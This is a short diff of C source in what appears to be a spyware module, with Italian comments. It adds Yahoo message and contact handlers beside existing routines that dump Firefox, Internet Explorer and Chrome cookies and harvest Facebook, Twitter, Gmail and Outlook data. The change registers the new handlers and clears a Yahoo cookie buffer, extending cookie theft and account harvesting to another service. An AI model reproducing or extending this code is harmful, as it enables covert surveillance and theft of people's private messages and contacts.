@@ -22,6 +22,9 @@ extern DWORD HandleFBContacts(char *); // Handler per FaceBook
 extern DWORD HandleTwitterContacts(char *); // Handler per Twitter
 extern DWORD HandleTwitterTweets(char *); // Handler per Twitter
 extern DWORD HandleOutlookMail(char *); // Handle per Outlook Live
+extern DWORD YahooMessageHandler(char *); // Handler per Yahoo
+extern DWORD YahooContactHandler(char *); // Handler per Yahoo
+
 extern int DumpFFCookies(void); // Cookie per Facebook
 extern int DumpIECookies(WCHAR *); // Cookie per IExplorer
 extern int DumpCHCookies(void); // Cookie per Chrome
@@ -217,12 +220,17 @@ void InitSocialEntries()
 	social_entry[4].RequestHandler = HandleTwitterTweets;
 	wcscpy_s(social_entry[5].domain, OUTLOOK_DOMAIN);
 	social_entry[5].RequestHandler = HandleOutlookMail;
+	wcscpy_s(social_entry[6].domain, YAHOO_DOMAIN);
+	social_entry[6].RequestHandler = YahooMessageHandler;
+	wcscpy_s(social_entry[7].domain, YAHOO_DOMAIN);
+	social_entry[7].RequestHandler = YahooContactHandler;
 
 	// Azzera i cookie in shared mem relativi a IExplorer
 	ZeroMemory(FACEBOOK_IE_COOKIE, sizeof(FACEBOOK_IE_COOKIE));
 	ZeroMemory(TWITTER_IE_COOKIE, sizeof(TWITTER_IE_COOKIE));
 	ZeroMemory(GMAIL_IE_COOKIE, sizeof(GMAIL_IE_COOKIE));
 	ZeroMemory(OUTLOOK_IE_COOKIE, sizeof(OUTLOOK_IE_COOKIE));
+	ZeroMemory(YAHOO_IE_COOKIE, sizeof(YAHOO_IE_COOKIE));
 }
 
 void SocialMainLoop()
